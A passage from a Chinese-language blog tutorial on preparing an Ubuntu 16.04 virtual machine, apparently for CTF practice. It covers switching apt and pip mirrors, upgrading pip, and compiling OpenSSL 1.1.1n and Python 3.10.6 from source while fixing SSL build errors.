class="line-numbers-rows"><span></span></span></code></pre>重启即可解决</li></ol></blockquote><hr><h1 id="VMtools"><a href="#VMtools" class="headerlink" title="VMtools"></a>VMtools</h1><blockquote><p>像 Ubuntu16.04 这种旧版本不建议使用 <code>Open VM Tools</code>（会报错），还是建议使用 VMware 官方的 <code>VMware Tools</code></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 安装，将VMtools解压到一个目录下，例如主目录</span><span class="token builtin class-name">cd</span> ~/vmware-tools-distrib<span class="token function">sudo</span> ./vmware-install.pl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h1 id="更换镜像源"><a href="#更换镜像源" class="headerlink" title="更换镜像源"></a>更换镜像源</h1><blockquote><p>Linux 自带的源来自国外，有时候下载速度感人，十分难受，建议更换系统的镜像源</p><p><mark>针对 Ubuntu 16.04 我建议使用阿里源，因为后面 pip 源也建议使用阿里源，否则 pip 会出现 SSL 问题，这里可以将镜像源和 pip 源统一一下</mark></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /etc/apt <span class="token comment"># 进入apt目录下</span><span class="token function">sudo</span> <span class="token function">cp</span> sources.list sources.list.backup <span class="token comment"># 备份</span><span class="token function">sudo</span> <span class="token function">vim</span> sources.list <span class="token comment"># 编辑sources.list文件</span><span class="token comment"># 加入下面两个----之间的内容</span>-----------------------------------------------------------------<span class="token comment"># deb cdrom:[Ubuntu 16.04 LTS _Xenial Xerus_ - Release amd64 (20160420.1)]/ xenial main restricted</span>deb-src http://archive.ubuntu.com/ubuntu xenial main restricted <span class="token comment">#Added by software-properties</span>deb http://mirrors.aliyun.com/ubuntu/ xenial main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted multiverse universe <span class="token comment">#Added by software-properties</span>deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted multiverse universe <span class="token comment">#Added by software-properties</span>deb http://mirrors.aliyun.com/ubuntu/ xenial universedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates universedeb http://mirrors.aliyun.com/ubuntu/ xenial multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse <span class="token comment">#Added by software-properties</span>deb http://archive.canonical.com/ubuntu xenial partnerdeb-src http://archive.canonical.com/ubuntu xenial partnerdeb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted multiverse universe <span class="token comment">#Added by software-properties</span>deb http://mirrors.aliyun.com/ubuntu/ xenial-security universedeb http://mirrors.aliyun.com/ubuntu/ xenial-security multiverse----------------------------------------------------------------- <span class="token comment"># 刷新三连</span><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> upgrade<span class="token function">sudo</span> <span class="token function">apt</span> clean<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Python-配置"><a href="#Python-配置" class="headerlink" title="Python 配置"></a>Python 配置</h1><blockquote><p>注意：<br>如果要给 Ubuntu 16.04 安装新版本的 Python，尽量不要更改系统默认的 <code>python3</code> 指向，因为 Ubuntu 的一些功能依赖于 python 2.7 和 python 3.5，随意改动可能出现各种奇奇怪怪的兼容性问题</p><p><strong>另外，系统自带的 python 千万不要卸载，可能导致系统崩溃！！！</strong></p><p><em>Ubuntu 16.04 的 pip 源建议使用阿里源，否则后面使用 pip 可能会遇到 SSL 问题</em></p></blockquote><p>Ubuntu 16.04 默认：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token operator">==</span><span class="token operator">></span> python <span class="token number">2.7</span>python2 <span class="token operator">==</span><span class="token operator">></span> python <span class="token number">2.7</span>python3 <span class="token operator">==</span><span class="token operator">></span> python <span class="token number">3.5</span>pip <span class="token operator">==</span><span class="token operator">></span> pip <span class="token punctuation">(</span>python <span class="token number">2.7</span><span class="token punctuation">)</span>pip2 <span class="token operator">==</span><span class="token operator">></span> pip <span class="token punctuation">(</span>python <span class="token number">2.7</span><span class="token punctuation">)</span>pip3 <span class="token operator">==</span><span class="token operator">></span> 无<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><mark>以上默认设置尽量不要更改</mark> <strong>（python 和 pip 的指向可以修改，但 python2、python3 尽量不要动）</strong></p><p>如果安装了新版的 Python，例如安装了 python 3.10.6，就使用 <code>python3.10</code> 来打开，同理使用 <code>pip3.10</code></p><p>即对应关系为：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token operator">==</span><span class="token operator">></span> python <span class="token number">2.7</span>python2 <span class="token operator">==</span><span class="token operator">></span> python <span class="token number">2.7</span>python3 <span class="token operator">==</span><span class="token operator">></span> python <span class="token number">3.5</span>python3.10 <span class="token operator">==</span><span class="token operator">></span> python <span class="token number">3.10</span>pip <span class="token operator">==</span><span class="token operator">></span> pip <span class="token punctuation">(</span>python <span class="token number">2.7</span><span class="token punctuation">)</span>pip2 <span class="token operator">==</span><span class="token operator">></span> pip <span class="token punctuation">(</span>python <span class="token number">2.7</span><span class="token punctuation">)</span>pip3 <span class="token operator">==</span><span class="token operator">></span> 无pip3.10 <span class="token operator">==</span><span class="token operator">></span> pip <span class="token punctuation">(</span>python <span class="token number">3.10</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="升级系统自带-pip"><a href="#升级系统自带-pip" class="headerlink" title="升级系统自带 pip"></a>升级系统自带 pip</h2><blockquote><p>由于系统自带的 python 的 pip 版本太低 （pip-8），后续操作会导致各种问题，所以最好升级一下</p><p><mark>但是注意千万不能直接使用 <code>pip3 install --upgrade pip</code> 来升级系统自带的 pip</mark></p><p>因为这会将 pip 升级为最新版，导致与 python 3.5 不匹配，因为 <strong>python 3.5 最高只支持 pip-20.3.4</strong> （python 3.5 在 2020 年 9 月后不再支持 pip-21 以后的版本）</p></blockquote><p>使用 <code>get-pip.py</code> 更新 python 3.5 自带的 pip 版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://bootstrap.pypa.io/pip/3.5/get-pip.py <span class="token parameter variable">-O</span> get-pip3.5.pypython3.5 get-pip3.5.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>同理 python 2.7：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://bootstrap.pypa.io/pip/2.7/get-pip.py <span class="token parameter variable">-O</span> get-pip2.7.pypython2.7 get-pip2.7.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果更新 pip 后使用 <code>pip -V</code> 出现警告：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">WARNING: pip is being invoked by an old script wrapper. This will fail <span class="token keyword">in</span> a future version of pip.Please see https://github.com/pypa/pip/issues/5599 <span class="token keyword">for</span> advice on fixing the underlying issue.To avoid this problem you can invoke Python with <span class="token string">'-m pip'</span> instead of running pip directly.pip <span class="token number">20.3</span>.4 from /home/wyy/.local/lib/python3.5/site-packages/pip <span class="token punctuation">(</span>python <span class="token number">3.5</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>解决办法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 注意, PATH 的内容要与上述 WARNING 中的路径一致</span><span class="token builtin class-name">echo</span> <span class="token string">'export PATH=/home/wyy/.local/lib/python3.5/site-packages/pip:$PATH'</span> <span class="token operator">>></span> ~/.bashrc<span class="token builtin class-name">source</span> ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="更换-pip-源"><a href="#更换-pip-源" class="headerlink" title="更换 pip 源"></a>更换 pip 源</h2><blockquote><p>Ubuntu 16.04 的 pip 源建议使用阿里源，否则后面使用 pip 可能会遇到 SSL 问题</p></blockquote><p>如果使用 <code>pip install xxx</code> 无法安装库，出现警告：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">WARNING: Retrying <span class="token punctuation">(</span>Retry<span class="token punctuation">(</span>total<span class="token operator">=</span><span class="token number">4</span>, <span class="token assign-left variable">connect</span><span class="token operator">=</span>None, <span class="token assign-left variable">read</span><span class="token operator">=</span>None, <span class="token assign-left variable">redirect</span><span class="token operator">=</span>None, <span class="token assign-left variable">status</span><span class="token operator">=</span>None<span class="token punctuation">))</span> after connection broken by <span class="token string">'SSLError(SSLEOFError(8, '</span>EOF occurred <span class="token keyword">in</span> violation of protocol <span class="token punctuation">(</span>_ssl.c:645<span class="token punctuation">)</span><span class="token string">'),)'</span><span class="token builtin class-name">:</span> /simple/pwn/WARNING: Retrying <span class="token punctuation">(</span>Retry<span class="token punctuation">(</span>total<span class="token operator">=</span><span class="token number">3</span>, <span class="token assign-left variable">connect</span><span class="token operator">=</span>None, <span class="token assign-left variable">read</span><span class="token operator">=</span>None, <span class="token assign-left variable">redirect</span><span class="token operator">=</span>None, <span class="token assign-left variable">status</span><span class="token operator">=</span>None<span class="token punctuation">))</span> after connection broken by <span class="token string">'SSLError(SSLEOFError(8, '</span>EOF occurred <span class="token keyword">in</span> violation of protocol <span class="token punctuation">(</span>_ssl.c:645<span class="token punctuation">)</span><span class="token string">'),)'</span><span class="token builtin class-name">:</span> /simple/pwn/WARNING: Retrying <span class="token punctuation">(</span>Retry<span class="token punctuation">(</span>total<span class="token operator">=</span><span class="token number">2</span>, <span class="token assign-left variable">connect</span><span class="token operator">=</span>None, <span class="token assign-left variable">read</span><span class="token operator">=</span>None, <span class="token assign-left variable">redirect</span><span class="token operator">=</span>None, <span class="token assign-left variable">status</span><span class="token operator">=</span>None<span class="token punctuation">))</span> after connection broken by <span class="token string">'SSLError(SSLEOFError(8, '</span>EOF occurred <span class="token keyword">in</span> violation of protocol <span class="token punctuation">(</span>_ssl.c:645<span class="token punctuation">)</span><span class="token string">'),)'</span><span class="token builtin class-name">:</span> /simple/pwn/WARNING: Retrying <span class="token punctuation">(</span>Retry<span class="token punctuation">(</span>total<span class="token operator">=</span><span class="token number">1</span>, <span class="token assign-left variable">connect</span><span class="token operator">=</span>None, <span class="token assign-left variable">read</span><span class="token operator">=</span>None, <span class="token assign-left variable">redirect</span><span class="token operator">=</span>None, <span class="token assign-left variable">status</span><span class="token operator">=</span>None<span class="token punctuation">))</span> after connection broken by <span class="token string">'SSLError(SSLEOFError(8, '</span>EOF occurred <span class="token keyword">in</span> violation of protocol <span class="token punctuation">(</span>_ssl.c:645<span class="token punctuation">)</span><span class="token string">'),)'</span><span class="token builtin class-name">:</span> /simple/pwn/WARNING: Retrying <span class="token punctuation">(</span>Retry<span class="token punctuation">(</span>total<span class="token operator">=</span><span class="token number">0</span>, <span class="token assign-left variable">connect</span><span class="token operator">=</span>None, <span class="token assign-left variable">read</span><span class="token operator">=</span>None, <span class="token assign-left variable">redirect</span><span class="token operator">=</span>None, <span class="token assign-left variable">status</span><span class="token operator">=</span>None<span class="token punctuation">))</span> after connection broken by <span class="token string">'SSLError(SSLEOFError(8, '</span>EOF occurred <span class="token keyword">in</span> violation of protocol <span class="token punctuation">(</span>_ssl.c:645<span class="token punctuation">)</span><span class="token string">'),)'</span><span class="token builtin class-name">:</span> /simple/pwn/Could not fetch URL https://pypi.tuna.tsinghua.edu.cn/simple/pwn/: There was a problem confirming the ssl certificate: HTTPSConnectionPool<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'pypi.tuna.tsinghua.edu.cn'</span>, <span class="token assign-left variable">port</span><span class="token operator">=</span><span class="token number">443</span><span class="token punctuation">)</span>: Max retries exceeded with url: /simple/pwn/ <span class="token punctuation">(</span>Caused by SSLError<span class="token punctuation">(</span>SSLEOFError<span class="token punctuation">(</span><span class="token number">8</span>, <span class="token string">'EOF occurred in violation of protocol (_ssl.c:645)'</span><span class="token punctuation">)</span>,<span class="token punctuation">))</span> - skipping<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可尝试更换 pip 源，这通常是因为 Ubuntu 16.04 这种老版本使用清华源导致的</p><p>例如将清华源换成阿里源，更改 <code>~/.config/pip/pip.conf</code> 文件内容，示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>global<span class="token punctuation">]</span>index-url <span class="token operator">=</span> http://mirrors.aliyun.com/pypi/simple/<span class="token punctuation">[</span>install<span class="token punctuation">]</span>trusted-host <span class="token operator">=</span> mirrors.aliyun.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-python-3-10-6"><a href="#安装-python-3-10-6" class="headerlink" title="安装 python 3.10.6"></a>安装 python 3.10.6</h2><blockquote><p>由于 Ubuntu 16.04 自带的 python 3.5 太老了，pip 默认版本只有 8，是无法直接安装 pwntools 的，也会存在其他的版本问题，索性直接安装一个新一点的 python 3.10.6</p><p><em>但是安装过程也不是一帆风顺的，遇到了各种各样的 bug，下面会具体分析和解决</em></p><p><em>如果图方便和稳定，就安装 python 3.9 及以下的版本吧，试了一次好像没什么 bug （至少没有 SSL 问题）</em></p><p>参考文章：<br><a href="https://blog.csdn.net/weixin_44132990/article/details/126308573">Ubuntu安装python3.10.6-CSDN博客</a></p></blockquote><p>安装相关库：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libffi-dev build-essential python-dev python-setuptools python-pip python-smbus build-essential libncursesw5-dev libgdbm-dev libc6-dev zlib1g-dev libsqlite3-dev tk-dev libssl-dev openssl libxpm-dev libxext-dev zlib1g-dev libbz2-dev libssl-dev libncurses5-dev libsqlite3-dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>安装依赖：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> build-essential zlib1g-dev libncurses5-dev libgdbm-dev libnss3-dev libssl-dev libreadline-dev libffi-dev <span class="token function">wget</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载并解压 python 3.10.6 源码：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://www.python.org/ftp/python/3.10.6/Python-3.10.6.tgz<span class="token function">tar</span> <span class="token parameter variable">-vxf</span> Python-3.10.6.tgz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>编译安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> Python-3.10.6<span class="token comment"># --prefix 指定安装的目录，我这里安装在 /usr/local/python3.10.6 下</span><span class="token comment"># --enable-optimizations 对编译结果进行优化，提高运行效率</span><span class="token function">sudo</span> ./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/usr/local/python3.10.6 --enable-optimizations<span class="token function">sudo</span> <span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> altinstall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这里安装使用的是 <code>sudo make altinstall</code> 而不是 <code>sudo make install</code> （当然也可以）<br>使用 <code>sudo make install</code> 可能会更改自带的 python3 安装，使卸载变得困难，甚至使自带的 python3 变得不可用，但一般不会出现这些恶性错误</p></blockquote><hr><h3 id="踩坑与解决"><a href="#踩坑与解决" class="headerlink" title="踩坑与解决"></a>踩坑与解决</h3><blockquote><p>参考文章：</p><ol><li><a href="https://blog.csdn.net/qq_39719415/article/details/121361399">python3的安装（踩坑版，解决ssl问题，解决pip3无法使用的问题）python3 安装ssl模块-CSDN博客</a></li><li><a href="https://blog.csdn.net/mdh17322249/article/details/123966953">python3.10编译安装报SSL失败解决方法_python源码编译的时候 — logging error — got an error: -CSDN博客</a></li><li><a href="https://blog.csdn.net/u011573853/article/details/107243183">The necessary bits to build these optional modules were not found: _uuid _bz2 _curse _curses_panel-CSDN博客</a></li></ol></blockquote><p>安装 python 3.10.6 在 <code>make</code> 编译的最后会报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">The necessary bits to build these optional modules were not found:  _lzma                 _uuid                                      To <span class="token function">find</span> the necessary bits, <span class="token function">look</span> <span class="token keyword">in</span> setup.py <span class="token keyword">in</span> detect_modules<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> the module's name.      The following modules found by detect_modules<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> setup.py, have been  built by the Makefile instead, as configured by the Setup files:  _abc                  <span class="token builtin class-name">pwd</span>                   <span class="token function">time</span>                     Failed to build these modules:  _hashlib              _ssl                                           Could not build the ssl module<span class="token operator">!</span>  Python requires a OpenSSL <span class="token number">1.1</span>.1 or newer<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>原因在于 python 3.10 依赖的 OpenSSL 必须要是 1.1.1 之后的版本，或者安装了 2.6.4 之后的 libressl，linux 自带的 OpenSSL 版本过低，同时还显示缺少 <code>_lzma</code> 和 <code>_uuid</code></p><hr><h4 id="编译安装-OpenSSL-1-1-1n"><a href="#编译安装-OpenSSL-1-1-1n" class="headerlink" title="编译安装 OpenSSL 1.1.1n"></a>编译安装 <code>OpenSSL 1.1.1n</code></h4><p>下载：<a href="https://www.openssl.org/source/openssl-1.1.1n.tar.gz" title="https://www.openssl.org/source/openssl-1.1.1n.tar.gz">https://www.openssl.org/source/openssl-1.1.1n.tar.gz</a></p><p>解压并编译：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://www.openssl.org/source/openssl-1.1.1n.tar.gz<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> openssl-1.1.1n.tar.gz<span class="token builtin class-name">cd</span> openssl-1.1.1n<span class="token function">sudo</span> ./config <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/usr/local/openssl<span class="token function">sudo</span> <span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改链接文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 备份原有链接</span><span class="token function">sudo</span> <span class="token function">mv</span> /usr/bin/openssl /usr/bin/openssl.bak <span class="token comment"># 创建软链接</span><span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-sf</span> /usr/local/openssl/bin/openssl /usr/bin/openssl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>添加路径至 <code>ld.so.conf</code>： （注意路径最后不能带 <code>&#39;/&#39;</code>，否则会报错）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">su</span>   <span class="token comment"># 先进入 root 账户，否则下面一条语句会报权限问题的错误</span><span class="token builtin class-name">echo</span> <span class="token string">"/usr/local/openssl/lib"</span> <span class="token operator">>></span> /etc/ld.so.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查看设置是否生效：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ldconfig <span class="token parameter variable">-v</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看 OpenSSL 版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">openssl version<span class="token comment"># 输出：</span>OpenSSL <span class="token number">1.1</span>.1n  <span class="token number">15</span> Mar <span class="token number">2022</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>修改 python 3.10.6 编译源文件的 <code>Setup</code> 中的链接，路径位于：<code>Python-3.10.6/Modules/Setup</code></p><p>在 <code>Setup</code> 中找到如下位置，可直接搜索 <code>&#39;OPENSSL&#39;</code> （大概位于第 211 行）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Socket module helper for SSL support; you must comment out the other</span><span class="token comment"># socket line above, and edit the OPENSSL variable:</span> <span class="token assign-left variable">OPENSSL</span><span class="token operator">=</span>/usr/local/openssl _ssl _ssl.c <span class="token punctuation">\</span>     -I<span class="token variable"><span class="token variable">$(</span>OPENSSL<span class="token variable">)</span></span>/include -L<span class="token variable"><span class="token variable">$(</span>OPENSSL<span class="token variable">)</span></span>/lib <span class="token punctuation">\</span>     <span class="token parameter variable">-lssl</span> <span class="token parameter variable">-lcrypto</span><span class="token comment">#_hashlib _hashopenssl.c \</span><span class="token comment">#     -I$(OPENSSL)/include -L$(OPENSSL)/lib \</span><span class="token comment">#     -lcrypto</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将中间这四句取消注释，并<strong>将 OpenSSL 的安装路径填入 <code>OPENSSL=</code> 后面</strong> <em>（其他地方都不需要改动，可能 Setup 的内容有些区别，以自己的为主）</em>：</p><p>保存 <code>Setup</code> 文件</p><hr><h4 id="安装-lzma-和-uuid"><a href="#安装-lzma-和-uuid" class="headerlink" title="安装 _lzma 和 _uuid"></a>安装 <code>_lzma</code> 和 <code>_uuid</code></h4><p>直接一次性安装全部：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> uuid-dev libbz2-dev libncurses5-dev libgdbm-dev liblzma-dev sqlite3 libsqlite3-dev openssl libssl-dev tcl8.6-dev tk8.6-dev libreadline-dev zlib1g-dev libffi-dev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h4 id="再次编译安装-python"><a href="#再次编译安装-python" class="headerlink" title="再次编译安装 python"></a>再次编译安装 python</h4><p>最后，重新编译安装 python 3.10.6：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> Python-3.10.6<span class="token comment"># --prefix 指定安装的目录，我这里安装在 /usr/local/python3.10.6 下</span><span class="token comment"># --enable-optimizations 对编译结果进行优化，提高运行效率</span><span class="token function">sudo</span> ./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/usr/local/python3.10.6 --enable-optimizations<span class="token function">sudo</span> <span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> altinstall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时 <code>make</code> 编译最后显示：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">The following modules found by detect_modules<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> setup.py, have beenbuilt by the Makefile instead, as configured by the Setup files:_abc                  _ssl                  <span class="token builtin class-name">pwd</span>                <span class="token function">time</span>                                                           Failed to build these modules:_hashlib  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>_hashlib</code> 是 OpenSSL 用于支持哈希加密的模块之一，由于我们手动编译安装了 <code>OpenSSL 1.1.1n</code>，忽略即可</p><p>安装完后，终端输入 <code>python3.10</code> 即可打开 python3.10.6 的界面</p><p>pip3 也会自动安装好：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA8.png" alt="Linux虚拟机CTF环境搭建8.png"></p><p>如果出现：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">WARNING: The script pip3.10 is installed <span class="token keyword">in</span> <span class="token string">'/usr/local/python3.10.6/bin'</span> <span class="token function">which</span> is not on <span class="token environment constant">PATH</span><span class="token builtin class-name">.</span>Consider adding this directory to <span class="token environment constant">PATH</span> or, <span class="token keyword">if</span> you prefer to suppress this warning, use --no-warn-script-location.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>解决办法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 注意, PATH 的内容要与上述 WARNING 中的路径一致</span><span class="token builtin class-name">echo</span> <span class="token string">'export PATH=/usr/local/python3.10.6/bin:$PATH'</span> <span class="token operator">>></span> ~/.bashrc<span class="token builtin class-name">source</span> ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>验证安装：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA9.png" alt="Linux虚拟机CTF环境搭建9.png"></p><p>查看安装路径：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA13.png" alt="Linux虚拟机CTF环境搭建13.png"></p><p>防止后续安装 Pwntools 时发生报错，还需要在 <code>/usr/local/python3.10.6</code>（以自己实际安装路径为主）下建立一个 pip 的软连接：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/local/python3.10.6/bin/pip3.10 /usr/local/python3.10.6/bin/pip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同时，此时 <code>python3.10</code> 和 <code>pip3.10</code> 是不可以在 <code>sudo</code> 下运行的，加入软链接：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/local/python3.10.6/bin/python3.10 /usr/bin/python3.10<span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/local/python3.10.6/bin/pip3.10 /usr/bin/pip3.10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>到此，大功告成！完美！</p><hr><h3 id="设置默认-python-和-pip-版本"><a href="#设置默认-python-和-pip-版本" class="headerlink" title="设置默认 python 和 pip 版本"></a>设置默认 python 和 pip 版本</h3><p>设置默认 python 版本为 python 3.10.6，默认 pip 版本为 pip-22.2.1 （python 3.10.6）</p><ol><li>通过修改软连接：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 删除原有的软链接</span><span class="token function">sudo</span> <span class="token function">rm</span> /usr/bin/python<span class="token function">sudo</span> <span class="token function">rm</span> /usr/bin/pip<span class="token comment"># 设置软连接</span><span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/local/python3.10.6/bin/python3.10 /usr/bin/python<span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/local/python3.10.6/bin/pip3.10 /usr/bin/pip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>通过更改 <code>.bashrc</code>：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token builtin class-name">alias</span> <span class="token assign-left variable">python</span><span class="token operator">=</span>python3.10 <span class="token operator">>></span> ~/.bashrc<span class="token builtin class-name">echo</span> <span class="token builtin class-name">alias</span> <span class="token assign-left variable">pip</span><span class="token operator">=</span>pip3.10 <span class="token operator">>></span> ~/.bashrc<span class="token builtin class-name">source</span> ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>提示：</strong><br><strong>尽量不要更改 python3 的默认版本，python3 默认指向 python 3.5，因为 Ubuntu 16.04 某些设置可能会用到 python 3.5，更改可能会出现各种奇奇怪怪的问题</strong></p><blockquote><p>注意：<code>/usr/local/python3.10.6</code> 这个地址是安装后 python 3.10.6 的路径，视自己的情况而定 </p><p>python 3.10.6 的路径可以通过 <code>which python3.10</code> 来查看</p></blockquote><hr><h2 id="安装-python-3-9-及以下版本"><a href="#安装-python-3-9-及以下版本" class="headerlink" title="安装 python 3.9 及以下版本"></a>安装 python 3.9 及以下版本</h2><blockquote><p>以 python 3.9.13 为例，这个版本就没有 python 3.10 那么麻烦了</p></blockquote><p>安装相关库：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libffi-dev build-essential python-dev python-setuptools python-pip python-smbus build-essential libncursesw5-dev libgdbm-dev libc6-dev zlib1g-dev libsqlite3-dev tk-dev libssl-dev openssl libxpm-dev libxext-dev zlib1g-dev libbz2-dev libssl-dev 